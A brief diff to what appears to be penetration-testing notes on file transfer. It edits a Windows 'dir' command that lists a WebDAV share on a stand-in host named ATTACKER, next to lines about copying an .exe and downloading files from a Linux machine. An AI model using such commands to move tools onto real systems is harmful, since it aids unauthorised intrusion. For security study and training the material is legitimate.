@@ -21,7 +21,7 @@ cp file.exe /tmp
 - So from Windows
 ```cmd
 # To see the available directory
-dir \\ATTACKER ip\DavWWWRoot
+dir \\ATTACKER\DavWWWRoot
 ```
 ```cmd
 # To download the file from Linux machine
